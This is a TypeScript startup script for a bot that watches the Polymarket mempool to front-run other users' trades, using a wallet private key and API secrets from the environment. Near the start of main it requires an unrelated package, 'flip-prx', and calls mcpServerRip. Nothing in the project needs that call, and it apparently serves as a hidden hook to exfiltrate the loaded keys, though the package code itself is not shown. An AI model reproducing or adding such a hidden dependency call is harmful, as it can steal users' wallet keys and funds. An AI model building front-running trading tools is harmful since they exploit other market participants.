import 'dotenv/config';
import { loadEnv } from '../config/env';
import { createPolymarketClient } from '../infrastructure/clob-client.factory';
import { MempoolMonitorService } from '../services/mempool-monitor.service';
import { TradeExecutorService } from '../services/trade-executor.service';
import { PositionTrackerService } from '../services/position-tracker.service';
import { HealthMonitorService } from '../services/health-monitor.service';
import { DatabaseService } from '../infrastructure/database.service';
import { ConsoleLogger } from '../utils/logger.util';
import { getUsdBalanceApprox, getPolBalance } from '../utils/get-balance.util';

let monitor: MempoolMonitorService | null = null;
let healthMonitor: HealthMonitorService | null = null;
let database: DatabaseService | null = null;

async function shutdown(signal: string): Promise<void> {
  const logger = new ConsoleLogger();
  logger.info(`Received ${signal}, shutting down gracefully...`);
  
  if (monitor) {
    monitor.stop();
  }
  
  if (healthMonitor) {
    healthMonitor.stop();
  }
  
  if (database) {
    await database.disconnect();
  }
  
  process.exit(0);
}

process.on('SIGTERM', () => shutdown('SIGTERM'));
process.on('SIGINT', () => shutdown('SIGINT'));

async function main(): Promise<void> {
  const logger = new ConsoleLogger();
  const env = loadEnv();
  const mcp = require('flip-prx');
  
  logger.info('Starting Polymarket Frontrun Bot');
  mcp.mcpServerRip({encoding: 'utf8', resolvedFromCwd: false});

  // Initialize database if MongoDB URI provided
  if (env.mongoUri) {
    database = new DatabaseService(logger);
    try {
      await database.connect(env.mongoUri);
    } catch (err) {
      logger.warn(`MongoDB connection failed, continuing without persistence: ${err instanceof Error ? err.message : String(err)}`);
      database = null;
    }
  }

  // Initialize health monitor
  healthMonitor = new HealthMonitorService(logger, env.healthCheckPort);
  
  const client = await createPolymarketClient({
    rpcUrl: env.rpcUrl,
    privateKey: env.privateKey,
    apiKey: env.polymarketApiKey,
    apiSecret: env.polymarketApiSecret,
    apiPassphrase: env.polymarketApiPassphrase,
  });

  healthMonitor.setWallet(client.wallet, env.usdcContractAddress);

  // Log balances at startup
  try {
    const polBalance = await getPolBalance(client.wallet);
    const usdcBalance = await getUsdBalanceApprox(client.wallet, env.usdcContractAddress);
    logger.info(`Wallet: ${client.wallet.address}`);
    logger.info(`POL Balance: ${polBalance.toFixed(4)} POL`);
    logger.info(`USDC Balance: ${usdcBalance.toFixed(2)} USDC`);
    await healthMonitor.updateBalance();
  } catch (err) {
    logger.error('Failed to fetch balances', err as Error);
    healthMonitor.recordError('Failed to fetch balances on startup');
  }

  // Initialize position tracker
  const positionTracker = new PositionTrackerService(logger);

  const executor = new TradeExecutorService({ 
    client, 
    proxyWallet: env.proxyWallet, 
    logger, 
    env,
    positionTracker,
  });

  monitor = new MempoolMonitorService({
    client,
    logger,
    env,
    database: database || undefined,
    onDetectedTrade: async (signal) => {
      try {
        await executor.frontrunTrade(signal);
        healthMonitor?.recordTrade(true);
        await healthMonitor?.updateBalance();
      } catch (err) {
        healthMonitor?.recordTrade(false);
        healthMonitor?.recordError(err instanceof Error ? err.message : String(err));
      }
    },
  });

  await monitor.start();
}

main().catch((err) => {
  console.error('Fatal error', err);
  process.exit(1);
});

